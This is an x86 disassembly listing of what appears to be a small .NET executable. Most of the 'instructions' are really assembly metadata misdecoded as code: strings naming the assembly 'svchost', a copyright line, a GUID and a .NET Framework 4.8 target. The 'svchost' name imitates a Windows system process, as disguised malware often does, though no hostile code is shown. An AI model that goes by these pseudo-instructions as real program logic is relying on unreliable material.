  40b835:	70 4e                	jo     0x40b885
  40b837:	6f                   	outsl  %ds:(%esi),(%dx)
  40b838:	6e                   	outsb  %ds:(%esi),(%dx)
  40b839:	45                   	inc    %ebp
  40b83a:	78 63                	js     0x40b89f
  40b83c:	65 70 74             	gs jo  0x40b8b3
  40b83f:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40b846:	77 73                	ja     0x40b8bb
  40b848:	01 05 20 01 01 11    	add    %eax,0x11010120
  40b84e:	35 08 01 00 07       	xor    $0x7000108,%eax
  40b853:	01 00                	add    %eax,(%eax)
  40b855:	00 00                	add    %al,(%eax)
  40b857:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40b85a:	00 07                	add    %al,(%edi)
  40b85c:	73 76                	jae    0x40b8d4
  40b85e:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  40b861:	73 74                	jae    0x40b8d7
  40b863:	00 00                	add    %al,(%eax)
  40b865:	05 01 00 00 00       	add    $0x1,%eax
  40b86a:	00 0f                	add    %cl,(%edi)
  40b86c:	01 00                	add    %eax,(%eax)
  40b86e:	0a 31                	or     (%ecx),%dh
  40b870:	36 37                	ss aaa
  40b872:	34 34                	xor    $0x34,%al
  40b874:	2d 39 36 35 33       	sub    $0x33353639,%eax
  40b879:	00 00                	add    %al,(%eax)
  40b87b:	21 01                	and    %eax,(%ecx)
  40b87d:	00 1c 43             	add    %bl,(%ebx,%eax,2)
  40b880:	6f                   	outsl  %ds:(%esi),(%dx)
  40b881:	70 79                	jo     0x40b8fc
  40b883:	72 69                	jb     0x40b8ee
  40b885:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40b88b:	20 31                	and    %dh,(%ecx)
  40b88d:	36 37                	ss aaa
  40b88f:	34 34                	xor    $0x34,%al
  40b891:	2d 39 36 35 33       	sub    $0x33353639,%eax
  40b896:	20 32                	and    %dh,(%edx)
  40b898:	30 32                	xor    %dh,(%edx)
  40b89a:	35 00 00 04 20       	xor    $0x20040000,%eax
  40b89f:	01 01                	add    %eax,(%ecx)
  40b8a1:	02 29                	add    (%ecx),%ch
  40b8a3:	01 00                	add    %eax,(%eax)
  40b8a5:	24 33                	and    $0x33,%al
  40b8a7:	61                   	popa
  40b8a8:	64 34 64             	fs xor $0x64,%al
  40b8ab:	34 36                	xor    $0x36,%al
  40b8ad:	35 2d 30 62 65       	xor    $0x6562302d,%eax
  40b8b2:	63 2d 34 33 61 39    	arpl   %ebp,0x39613334
  40b8b8:	2d 61 64 63 38       	sub    $0x38636461,%eax
  40b8bd:	2d 38 66 31 62       	sub    $0x62316638,%eax
  40b8c2:	36 39 66 62          	cmp    %esp,%ss:0x62(%esi)
  40b8c6:	64 38 31             	cmp    %dh,%fs:(%ecx)
  40b8c9:	34 00                	xor    $0x0,%al
  40b8cb:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40b8ce:	00 07                	add    %al,(%edi)
  40b8d0:	31 2e                	xor    %ebp,(%esi)
  40b8d2:	30 2e                	xor    %ch,(%esi)
  40b8d4:	30 2e                	xor    %ch,(%esi)
  40b8d6:	30 00                	xor    %al,(%eax)
  40b8d8:	00 49 01             	add    %cl,0x1(%ecx)
  40b8db:	00 1a                	add    %bl,(%edx)
  40b8dd:	2e 4e                	cs dec %esi
  40b8df:	45                   	inc    %ebp
  40b8e0:	54                   	push   %esp
  40b8e1:	46                   	inc    %esi
  40b8e2:	72 61                	jb     0x40b945
  40b8e4:	6d                   	insl   (%dx),%es:(%edi)
  40b8e5:	65 77 6f             	gs ja  0x40b957
  40b8e8:	72 6b                	jb     0x40b955
  40b8ea:	2c 56                	sub    $0x56,%al
  40b8ec:	65 72 73             	gs jb  0x40b962
  40b8ef:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40b8f6:	38 01                	cmp    %al,(%ecx)
  40b8f8:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40b8fc:	46                   	inc    %esi
  40b8fd:	72 61                	jb     0x40b960
  40b8ff:	6d                   	insl   (%dx),%es:(%edi)
  40b900:	65 77 6f             	gs ja  0x40b972
  40b903:	72 6b                	jb     0x40b970
  40b905:	44                   	inc    %esp
  40b906:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40b90d:	61                   	popa
  40b90e:	6d                   	insl   (%dx),%es:(%edi)
  40b90f:	65 12 2e             	adc    %gs:(%esi),%ch
  40b912:	4e                   	dec    %esi
  40b913:	45                   	inc    %ebp
  40b914:	54                   	push   %esp
  40b915:	20 46 72             	and    %al,0x72(%esi)
  40b918:	61                   	popa
  40b919:	6d                   	insl   (%dx),%es:(%edi)
  40b91a:	65 77 6f             	gs ja  0x40b98c
  40b91d:	72 6b                	jb     0x40b98a
  40b91f:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40b922:	38 03                	cmp    %al,(%ebx)
  40b924:	07                   	pop    %es
  40b925:	01 09                	add    %ecx,(%ecx)
  40b927:	0e                   	push   %cs
  40b928:	07                   	pop    %es
  40b929:	08 12                	or     %dl,(%edx)
  40b92b:	65 12 14 1d 05 08 08 	adc    %gs:0x12080805(,%ebx,1),%dl
  40b932:	12 
  40b933:	65 0a 09             	or     %gs:(%ecx),%cl
  40b936:	07                   	pop    %es
  40b937:	00 03                	add    %al,(%ebx)
  40b939:	01 12                	add    %edx,(%edx)
  40b93b:	6d                   	insl   (%dx),%es:(%edi)
  40b93c:	08 08                	or     %cl,(%eax)
  40b93e:	07                   	pop    %es
  40b93f:	20 03                	and    %al,(%ebx)
  40b941:	08 1d 05 08 08 06    	or     %bl,0x6080805
  40b947:	00 02                	add    %al,(%edx)
  40b949:	08 1d 05 08 06 20    	or     %bl,0x20060805
  40b94f:	02 01                	add    (%ecx),%al
  40b951:	1d 05 02 03 20       	sbb    $0x20030205,%eax
  40b956:	00 0a                	add    %cl,(%edx)
  40b958:	13 07                	adc    (%edi),%eax
  40b95a:	0d 09 1d 09 1d       	or     $0x1d091d09,%eax
  40b95f:	09 09                	or     %ecx,(%ecx)
  40b961:	08 08                	or     %cl,(%eax)
  40b963:	1d 09 1d 05 08       	sbb    $0x8051d09,%eax
  40b968:	08 08                	or     %cl,(%eax)
  40b96a:	09 09                	or     %ecx,(%ecx)
  40b96c:	07                   	pop    %es
  40b96d:	00 02                	add    %al,(%edx)
  40b96f:	01 12                	add    %edx,(%edx)
  40b971:	6d                   	insl   (%dx),%es:(%edi)
  40b972:	11 7d 10             	adc    %edi,0x10(%ebp)
  40b975:	07                   	pop    %es
  40b976:	09 08                	or     %ecx,(%eax)
  40b978:	1e                   	push   %ds
  40b979:	00 08                	add    %cl,(%eax)
  40b97b:	1d 1e 00 08 08       	sbb    $0x808001e,%eax
  40b980:	12 6d 1e             	adc    0x1e(%ebp),%ch
  40b983:	00 09                	add    %cl,(%ecx)
  40b985:	05 00 00 12 80       	add    $0x80120000,%eax
  40b98a:	81 04 20 01 02 1c 05 	addl   $0x51c0201,(%eax,%eiz,1)
  40b991:	00 00                	add    %al,(%eax)
  40b993:	12 80 85 07 20 03    	adc    0x3200785(%eax),%al
  40b999:	0e                   	push   %cs
  40b99a:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  40b99f:	00 01                	add    %al,(%ecx)
  40b9a1:	0e                   	push   %cs
  40b9a2:	0e                   	push   %cs
  40b9a3:	02 1e                	add    (%esi),%bl
  40b9a5:	00 08                	add    %cl,(%eax)
  40b9a7:	00 01                	add    %al,(%ecx)
  40b9a9:	12 80 8d 11 80 91    	adc    -0x6e7fee73(%eax),%al
  40b9af:	05 20 00 12 80       	add    $0x80120020,%eax
  40b9b4:	8d 08                	lea    (%eax),%ecx
  40b9b6:	00 02                	add    %al,(%edx)
  40b9b8:	12 6d 12             	adc    0x12(%ebp),%ch
  40b9bb:	80 8d 08 0a 00 05 01 	orb    $0x1,0x5000a08(%ebp)
  40b9c2:	12 6d 08             	adc    0x8(%ebp),%ch
  40b9c5:	12 6d 08             	adc    0x8(%ebp),%ch
  40b9c8:	08 20                	or     %ah,(%eax)
  40b9ca:	07                   	pop    %es
  40b9cb:	18 0e                	sbb    %cl,(%esi)
  40b9cd:	02 0f                	add    (%edi),%cl
  40b9cf:	05 07 07 0f 09       	add    $0x90f0707,%eax
  40b9d4:	09 0f                	or     %ecx,(%edi)
  40b9d6:	09 09                	or     %ecx,(%ecx)
  40b9d8:	09 09                	or     %ecx,(%ecx)
  40b9da:	09 1d 09 1d 09 09    	or     %ebx,0x9091d09
  40b9e0:	09 08                	or     %ecx,(%eax)
  40b9e2:	09 0f                	or     %ecx,(%edi)
  40b9e4:	09 09                	or     %ecx,(%ecx)
  40b9e6:	09 08                	or     %ecx,(%eax)
  40b9e8:	09 09                	or     %ecx,(%ecx)
  40b9ea:	05 20 00 12 80       	add    $0x80120020,%eax
  40b9ef:	99                   	cltd
  40b9f0:	03 20                	add    (%eax),%esp
  40b9f2:	00 0e                	add    %cl,(%esi)
  40b9f4:	03 20                	add    (%eax),%esp
  40b9f6:	00 08                	add    %cl,(%eax)
  40b9f8:	04 20                	add    $0x20,%al
  40b9fa:	01 03                	add    %eax,(%ebx)
  40b9fc:	08 06                	or     %al,(%esi)
  40b9fe:	00 01                	add    %al,(%ecx)
  40ba00:	18 12                	sbb    %dl,(%edx)
  40ba02:	80 99 05 00 01 0f 01 	sbbb   $0x1,0xf010005(%ecx)
  40ba09:	18 05 00 01 18 0f    	sbb    %al,0xf180100
  40ba0f:	01 04 07             	add    %eax,(%edi,%eax,1)
  40ba12:	02 09                	add    (%ecx),%cl
  40ba14:	09 05 07 03 09 08    	or     %eax,0x8090307
  40ba1a:	09 07                	or     %eax,(%edi)
  40ba1c:	07                   	pop    %es
  40ba1d:	05 09 09 08 09       	add    $0x9080909,%eax
  40ba22:	09 04 07             	or     %eax,(%edi,%eax,1)
  40ba25:	02 08                	add    (%eax),%cl
  40ba27:	09 08                	or     %ecx,(%eax)
  40ba29:	07                   	pop    %es
  40ba2a:	06                   	push   %es
  40ba2b:	09 09                	or     %ecx,(%ecx)
  40ba2d:	09 08                	or     %ecx,(%eax)
  40ba2f:	09 09                	or     %ecx,(%ecx)
  40ba31:	05 00 02 09 09       	add    $0x9090200,%eax
  40ba36:	09 06                	or     %eax,(%esi)
  40ba38:	07                   	pop    %es
  40ba39:	04 09                	add    $0x9,%al
  40ba3b:	09 09                	or     %ecx,(%ecx)
  40ba3d:	09 13                	or     %edx,(%ebx)
  40ba3f:	07                   	pop    %es
  40ba40:	10 11                	adc    %dl,(%ecx)
  40ba42:	28 09                	sub    %cl,(%ecx)
  40ba44:	09 09                	or     %ecx,(%ecx)
  40ba46:	09 0b                	or     %ecx,(%ebx)
  40ba48:	0b 05 09 05 05 09    	or     0x9050509,%eax
  40ba4e:	09 09                	or     %ecx,(%ecx)
  40ba50:	08 09                	or     %cl,(%ecx)
  40ba52:	08 07                	or     %al,(%edi)
  40ba54:	06                   	push   %es
  40ba55:	08 08                	or     %cl,(%eax)
  40ba57:	08 09                	or     %cl,(%ecx)
  40ba59:	08 09                	or     %cl,(%ecx)
  40ba5b:	05 07 03 09 09       	add    $0x9090307,%eax
  40ba60:	09 07                	or     %eax,(%edi)
  40ba62:	20 03                	and    %al,(%ebx)
  40ba64:	01 1d 05 08 08 09    	add    %ebx,0x9080805
  40ba6a:	07                   	pop    %es
  40ba6b:	07                   	pop    %es
  40ba6c:	0e                   	push   %cs
  40ba6d:	0e                   	push   %cs
  40ba6e:	0e                   	push   %cs
  40ba6f:	0e                   	push   %cs
  40ba70:	02 08                	add    (%eax),%cl
  40ba72:	09 03                	or     %eax,(%ebx)
  40ba74:	0a 01                	or     (%ecx),%al
  40ba76:	0e                   	push   %cs
  40ba77:	0a 07                	or     (%edi),%al
  40ba79:	06                   	push   %es
  40ba7a:	0e                   	push   %cs
  40ba7b:	12 19                	adc    (%ecx),%bl
  40ba7d:	12 21                	adc    (%ecx),%ah
  40ba7f:	02 02                	add    (%edx),%al
  40ba81:	09 05 20 01 01 11    	or     %eax,0x11010120
  40ba87:	1d 23 02 53 dc       	sbb    $0xdc530223,%eax
  40ba8c:	52                   	push   %edx
  40ba8d:	67 d6                	addr16 salc
  40ba8f:	48                   	dec    %eax
  40ba90:	98                   	cwtl
  40ba91:	f6 45 12 50          	testb  $0x50,0x12(%ebp)
  40ba95:	d9 5b db             	fstps  -0x25(%ebx)
	...

Disassembly of section :

0040e000 <>:
  40e000:	20 67 00             	and    %ah,0x0(%edi)
  40e003:	00 00                	add    %al,(%eax)
  40e005:	00 00                	add    %al,(%eax)
  40e007:	00 00                	add    %al,(%eax)
  40e009:	00 ff                	add    %bh,%bh
  40e00b:	25 00 e0 40 00       	and    $0x40e000,%eax
